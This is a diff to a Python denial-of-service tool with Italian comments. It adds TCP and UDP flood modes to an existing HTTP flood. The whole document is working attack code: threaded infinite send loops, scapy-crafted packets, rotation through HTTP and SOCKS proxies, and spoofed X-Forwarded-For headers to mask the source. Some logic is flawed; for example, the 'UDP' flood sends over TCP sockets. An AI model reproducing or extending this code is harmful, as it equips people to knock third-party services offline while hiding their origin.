@@ -65,10 +65,15 @@ def checkurl(): # in questa funzione setto l'url per renderlo usabile durante il
 
 def floodmode():
 	global choise1
-	choise1 = input("Do you want to perform HTTP flood '0' or SYN flood '1' ? ")
+	choise1 = input("Do you want to perform HTTP flood '0', TCP flood '1' or UDP flood '2' ? ")
 	if choise1 == "0":
 		proxymode()
 	elif choise1 == "1":
+		if os.getuid() != 0: # Controlla se il programma è stato eseguito come root.
+		    print("You need to run this program as root to use TCP flooding.")
+		    exit(0)
+		floodport()
+	elif choise1 == "2":
 		if os.getuid() != 0: # Controlla se il programma è stato eseguito come root.
 		    print("You need to run this program as root to use TCP flooding.")
 		    exit(0)
@@ -79,10 +84,11 @@ def floodmode():
 
 def floodport():
 	global port
-	try:
-		port = input("Enter the port you want to flood: ")
+	port = int(input("Enter the port you want to flood: "))
+	portlist = range(65535)
+	if port in portlist:
 		proxymode()
-	except:
+	else:
 		print ("You mistyped, try again.")
 		floodport()
 
@@ -198,7 +204,7 @@ def proxyget2(): # anche questa funzione scarica proxy però da inforge.net
 
 def proxylist():
 	global entries
-	out_file = str(input("Enter the proxy list name/path (proxy.txt): "))
+	out_file = str(input("Enter the proxylist filename/path (proxy.txt): "))
 	if out_file == "":
 		out_file = "proxy.txt"
 	entries = open(out_file).readlines()
@@ -225,6 +231,20 @@ def begin():
 
 def loop():
 	global threads
+	global p
+	global get_host
+	global accept
+	global connection
+	if choise1 == "1":
+		data = random._urandom(1024) # data per il pacchetto random
+		p = bytes(IP(dst=url2)/TCP(sport=RandShort(), dport=int(port))/data) # costruzione pacchetto tcp
+	elif choise1 == "2":
+		data = random._urandom(1024) # data per il pacchetto random
+		p = bytes(IP(dst=url2)/UDP(dport=int(port))/data) # crea pacchetto udp classico
+	else: # costruiamo anteprima richiesta HTTP (anteprima perchè la richiesta finale effettiva verrà creara dopo)
+		get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
+		accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
+		connection = "Connection: Keep-Alive\r\n" # la keep alive torna sempre utile lol
 	for x in range(threads): # con questa formula diciamo ai threads di attaccare.
 		attack().start() # start() non fa altro che leggere nella classe threading.Thread cercando la funzione run(self), la quale
                          # serve per dare istruzioni ai threads.
@@ -232,39 +252,45 @@ def loop():
 class attack(threading.Thread): # la classe del multithreading
 
 	def run(self): # la funzione che dà le istruzioni ai vari threads
-		if choise1 == "1": # se si è scelto syn flood
+		if choise1 == "1": # se si è scelto tcp flood
 			if choise2 == "y": # e si e scelta la modalità proxying
 				if choise3 == "0": # e si sono scelti gli HTTP proxy
-					self.proxedsynrequest() # usa la funzione apposita
+					self.tcpfloodproxed() # usa la funzione apposita
 				else:
-					self.sockedsynrequest() # se si sono scelti i socks, usa la funzione apposita
+					self.tcpfloodsocked() # se si sono scelti i socks, usa la funzione apposita
 			else:
-				self.synrequest() # se non si è scelta la proxying mode, usa la funzione tradizionale per il syn
-		else: # se si è scelto l'HTTP flood
-			self.setuprequest() # intanto costruiamo l' anteprima della richiesta (anteprima perchè la final request sarà dopo)
-			if choise2 == "y": # se abbiamo scelto lla modalità proxying
-				if choise3 == "0": # e abbiamo scelto gli HTTP proxy
-					self.requestproxy() # esegue attacco con proxy
-				elif choise3 == "1": # se abbiamo scelto i socks
-					self.requestsocks() # esegue attacco con socks
+				self.tcpflood() # se non si è scelta la proxying mode, usa la funzione tradizionale per il tcp flood
+		else: # oppure:
+			if choise1 == "2": # se si è scelto l'UDP flood
+				if choise2 == "y": # e si è scelta la modalità proxying
+					if choise3 == "0": # e si sono scelti gli HTTP proxy
+						self.udpfloodproxed() # usa la funzione apposita
+					else:
+						self.udpfloodsocked() # se si sono scelti i socks, usa la funzione apposita
 				else:
-					exit(0)
-			else: # altrimenti manda richieste normali non proxate.
-				self.requestdefault() # funzione richieste non proxed
+					self.udpflood()
+			else:
+				if choise2 == "y": # se abbiamo scelto la modalità proxying
+					if choise3 == "0": # e abbiamo scelto gli HTTP proxy
+						self.requestproxy() # esegue attacco con proxy
+					elif choise3 == "1": # se abbiamo scelto i socks
+						self.requestsocks() # esegue attacco con socks
+					else:
+						exit(0)
+				else: # altrimenti manda richieste normali non proxate.
+					self.requestdefault() # funzione richieste non proxed
 
-	def synrequest(self):
-		p = bytes(IP(dst=url2)/TCP(flags="S", sport=RandShort(), dport=int(port))) # costruzione pacchetto
+	def tcpflood(self): # funzione per tcp flood classico
 		while True: # ciclo infinito
-			try: # il try per non far chiudere il programma
-				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione socket classico
+			try: # il try per non far chiudere il programma se qualcosa va storto
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione solito socket
 				s.connect((str(url2),int(port))) # connessione al target
-				s.send(p) # questo manda il pacchetto syn creato al target
+				s.send(p) # questo manda il pacchetto tcp creato al target
 				print ("Request Sent!")
 			except: # se si verifica un errore
 				pass # lo ignora e ricomincia il ciclo
 
-	def proxedsynrequest(self): # funzione per il syn flood
-		p = bytes(IP(dst=url2)/TCP(flags="S", sport=RandShort(), dport=int(port)))
+	def tcpfloodproxed(self): # funzione per tcp flood con HTTP proxy
 		proxy = random.choice(entries).strip().split(":") # seleziona un proxy a random
 		while True:
 			try:
@@ -276,8 +302,7 @@ class attack(threading.Thread): # la classe del multithreading
 			except:
 				s.close()
 
-	def sockedsynrequest(self): # funzione per il syn flood
-		p = bytes(IP(dst=url2)/TCP(flags="S", sport=RandShort(), dport=int(port)))
+	def tcpfloodsocked(self): # funzione per tcp flood con socks
 		proxy = random.choice(entries).strip().split(":")
 		while True:
 			try:
@@ -297,17 +322,50 @@ class attack(threading.Thread): # la classe del multithreading
 				except: # se nemmeno questo funge, allora il sock è down
 					s.close() # chiude il socket e ricomincia ciclo
 
-	def setuprequest(self): # composizione anteprima richiesta
-		global get_host
-		global useragent
-		global accept
-		global connection
-		get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
-		useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
-		accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
-		connection = "Connection: Keep-Alive\r\n" # la keep alive torna sempre utile lol
+	def udpflood(self):
+		while True: # ciclo infinito
+			try: # il try per non far chiudere il programma se si verifica qualche errore
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione socket
+				s.connect((str(url2),int(port))) # connessione al target
+				s.send(p) # questo manda il pacchetto udp creato al target
+				print ("Request Sent!")
+			except: # se si verifica un errore
+				pass # lo ignora e ricomincia il ciclo
+
+	def udpfloodproxed(self): # funzione per udp flood con HTTP proxy
+		proxy = random.choice(entries).strip().split(":") # seleziona un proxy a random
+		while True:
+			try:
+				socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) # comando per il proxying HTTP
+				s = socks.socksocket() # creazione socket
+				s.connect((str(url2),int(port)))
+				s.send(p)
+				print ("Request sent from " + str(proxy[0]+":"+proxy[1]))
+			except:
+				s.close()
+
+	def udpfloodsocked(self): # funzione per udp flood con socks
+		proxy = random.choice(entries).strip().split(":")
+		while True:
+			try:
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) # comando per il proxying con SOCKS
+				s = socks.socksocket()
+				s.connect((str(url2),int(port)))
+				s.send(p)
+				print ("Request sent from " + str(proxy[0]+":"+proxy[1]))
+			except: # se qualcosa va storto
+				try: # prova con questo:
+					s.close() # intanto chiude il precedente socket non funzionante
+					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) # poi prova ad utilizzare SOCKS4, magari è questo il problema dell'errore
+					s = socks.socksocket()
+					s.connect((str(url2),int(port)))
+					s.send(p)
+					print ("Request sent from " + str(proxy[0]+":"+proxy[1]))
+				except: # se nemmeno questo funge, allora il sock è down
+					s.close() # chiude il socket e ricomincia ciclo
 
 	def requestproxy(self): # funzione dedicata all'invio di richiesto tramite proxy
+		useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
 		randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
 		forward = "X-Forwarded-For: " + randomip + "\r\n" # X-Forwarded-For, un header HTTP che permette di incrementare anonimato (vedi google per info)
 		request = get_host + useragent + accept + forward + connection + "\r\n" # ecco la final request
@@ -322,6 +380,7 @@ class attack(threading.Thread): # la classe del multithreading
 				s.close() # se qualcosa va storto, chiude il socket e il ciclo ricomincia
 
 	def requestsocks(self): # funzione per invio richieste tramite socks
+		useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
 		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
 		proxy = random.choice(entries).strip().split(":") # selezione di proxy causale
 		while True:
@@ -344,6 +403,7 @@ class attack(threading.Thread): # la classe del multithreading
 					s.close() # se nemmeno con quel try si è riuscito a inviare niente, allora il sock è down e chiude il socket.
 
 	def requestdefault(self): # funzione per l'invio di richieste non proxate
+		useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
 		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
 		while True:
 			try:
